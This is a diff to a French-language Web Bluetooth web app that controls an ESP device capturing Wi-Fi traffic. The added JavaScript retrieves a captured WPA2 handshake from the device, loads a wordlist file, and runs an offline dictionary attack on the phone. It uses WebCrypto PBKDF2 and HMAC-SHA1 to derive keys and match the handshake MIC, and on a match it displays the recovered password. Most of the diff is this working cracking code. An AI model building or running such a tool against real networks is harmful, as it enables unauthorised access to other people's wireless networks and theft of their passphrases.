@@ -66,12 +66,16 @@
       <button class="sm" data-cmd="capstop" id="btnCapStop">Stop capture</button>
     </div>
     <div id="crackBox" class="hide" style="margin-top:10px">
+      <div id="hsState" class="mono" style="margin-bottom:8px">Handshake non récupéré</div>
       <div class="row">
-        <button class="sm primary" data-cmd="crackdict" data-confirm="Lancer le crack par dictionnaire (/config/wordlist.txt) ?">Crack dico</button>
-        <button class="sm" data-cmd="crackbrute 2 8 8" data-confirm="Lancer le brute-force (abc123, 8)… ça va ramer (pédagogique)">Brute</button>
-        <button class="sm" data-cmd="crackstop">Stop</button>
+        <button class="sm" id="btnGetHs">Récupérer handshake</button>
+        <label class="sm" style="display:inline-flex;align-items:center;justify-content:center;background:var(--card2);border-radius:12px;padding:0 12px;min-height:38px;cursor:pointer">
+          Wordlist<input id="wl" type="file" accept=".txt,text/plain" style="display:none"></label>
+        <button class="sm primary" id="btnCrack" disabled>Cracker (tél)</button>
+        <button class="sm" id="btnCrackStop">Stop</button>
       </div>
       <div id="crkInfo" class="mono big" style="margin-top:8px">—</div>
+      <div class="sub" style="margin-top:4px">Le crack tourne <b>sur le téléphone</b> (WebCrypto), hors-ligne. WPA2/CCMP uniquement.</div>
     </div>
   </div>
 
@@ -84,6 +88,7 @@ const RX ='6e400002-b5a3-f393-e0a9-e50e24dcca9e';
 const TX ='6e400003-b5a3-f393-e0a9-e50e24dcca9e';
 let rxChar=null, txChar=null, dev=null;
 const aps=new Map();                 // idx -> {ssid,bssid,ch,sec,pmf,cli}
+let hsReq=false, HS=null, eaHex='', words=[], crackRun=false;
 const $=s=>document.querySelector(s);
 const enc=new TextEncoder(), dec=new TextDecoder();
 
@@ -127,12 +132,9 @@ function onLine(line){
     $('#pCap').classList.remove('hide');
     $('#capInfo').textContent=`canal ${p[1]} · EAPOL ${p[2]} · handshake ${hs?'✅ OK':'— en attente'}`;
     $('#crackBox').classList.toggle('hide', !hs);
+    if(hs && !hsReq){ hsReq=true; send('hs'); }     // tire le handshake une fois
   }
-  else if(line.startsWith('CRK,')){
-    const p=line.split(','); const found=p[3]==='1';
-    $('#crkInfo').innerHTML = found ? `🔓 TROUVÉ : <span style="color:var(--ok)">${esc(p[4])}</span>`
-       : `${Number(p[1]).toLocaleString('fr')} essais · ${p[2]==='1'?'en cours…':'arrêté'}`;
-  }
+  else if(line.startsWith('HS,')) onHsLine(line);
   else status(line);
 }
 
@@ -164,6 +166,68 @@ document.addEventListener('click',e=>{
   send(b.dataset.cmd);
   if(b.dataset.cmd.startsWith('cap ')) $('#pCap').classList.remove('hide');
 });
+
+/* ---- Handshake reçu de l'ESP ---- */
+function onHsLine(line){
+  const parts=line.split(','), key=parts[1], val=parts.slice(2).join(',');
+  if(key==='ssid'){ HS={ssid:val}; eaHex=''; }
+  else if(!HS) return;
+  else if(key==='aa') HS.aa=val; else if(key==='spa') HS.spa=val;
+  else if(key==='an') HS.an=val; else if(key==='sn') HS.sn=val;
+  else if(key==='mic') HS.mic=val; else if(key==='ver') HS.ver=val;
+  else if(key==='ea') eaHex+=val;
+  else if(key==='done'){ HS.ea=eaHex;
+    $('#hsState').textContent=`Handshake prêt : ${HS.ssid} (ver ${HS.ver})`;
+    $('#pCap').classList.remove('hide'); $('#crackBox').classList.remove('hide');
+    updateCrackBtn();
+  }
+}
+
+/* ---- Crack local WebCrypto (PBKDF2 -> PTK -> MIC) ---- */
+const hex2b=h=>Uint8Array.from(h.match(/../g).map(x=>parseInt(x,16)));
+const te=new TextEncoder();
+function cmp(a,b){ for(let i=0;i<a.length;i++) if(a[i]!==b[i]) return a[i]-b[i]; return 0; }
+function cat(...a){ let n=a.reduce((s,x)=>s+x.length,0),o=new Uint8Array(n),k=0; for(const x of a){o.set(x,k);k+=x.length;} return o; }
+async function pmkOf(pass,ssid){
+  const km=await crypto.subtle.importKey('raw',te.encode(pass),'PBKDF2',false,['deriveBits']);
+  return new Uint8Array(await crypto.subtle.deriveBits({name:'PBKDF2',hash:'SHA-1',salt:te.encode(ssid),iterations:4096},km,256));
+}
+async function hmac1(key,data){
+  const k=await crypto.subtle.importKey('raw',key,{name:'HMAC',hash:'SHA-1'},false,['sign']);
+  return new Uint8Array(await crypto.subtle.sign('HMAC',k,data));
+}
+async function micOf(pmk,aa,spa,an,sn,ea){
+  const [la,ha]=cmp(aa,spa)<0?[aa,spa]:[spa,aa];
+  const [ln,hn]=cmp(an,sn)<0?[an,sn]:[sn,an];
+  const data=cat(te.encode('Pairwise key expansion'),new Uint8Array([0]),cat(la,ha,ln,hn),new Uint8Array([0]));
+  const kck=(await hmac1(pmk,data)).slice(0,16);
+  return (await hmac1(kck,ea)).slice(0,16);
+}
+function updateCrackBtn(){ $('#btnCrack').disabled=!(HS&&HS.ea&&words.length); }
+async function startCrack(){
+  if(!(HS&&HS.ea&&words.length)) return;
+  if(HS.ver==='1'){ $('#crkInfo').textContent='TKIP (ver 1) non supporté dans le navigateur.'; return; }
+  const aa=hex2b(HS.aa),spa=hex2b(HS.spa),an=hex2b(HS.an),sn=hex2b(HS.sn),mic=hex2b(HS.mic),ea=hex2b(HS.ea);
+  crackRun=true; let i=0; const t0=performance.now();
+  while(crackRun && i<words.length){
+    const w=words[i++];
+    const m=await micOf(await pmkOf(w,HS.ssid),aa,spa,an,sn,ea);
+    if(cmp(m,mic)===0){ $('#crkInfo').innerHTML=`🔓 TROUVÉ : <span style="color:var(--ok)">${esc(w)}</span>`; crackRun=false; return; }
+    if(i%20===0){ const r=Math.round(i/((performance.now()-t0)/1000));
+      $('#crkInfo').textContent=`${i.toLocaleString('fr')}/${words.length} · ${r}/s`;
+      await new Promise(res=>setTimeout(res)); }
+  }
+  $('#crkInfo').textContent = i>=words.length ? `Épuisé — non trouvé (${words.length} testés)` : `Arrêté (${i} testés)`;
+  crackRun=false;
+}
+$('#btnGetHs').onclick=()=>{ hsReq=true; send('hs'); };
+$('#wl').addEventListener('change', async e=>{
+  const f=e.target.files[0]; if(!f) return;
+  words=(await f.text()).split(/\r?\n/).map(s=>s.trim()).filter(Boolean);
+  status(`Wordlist : ${words.length} mots`); updateCrackBtn();
+});
+$('#btnCrack').onclick=startCrack;
+$('#btnCrackStop').onclick=()=>{ crackRun=false; };
 
 if('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(()=>{});
 if(!navigator.bluetooth){ status('Web Bluetooth indisponible : utilise Chrome sur Android.'); $('#btnConnect').disabled=true; }
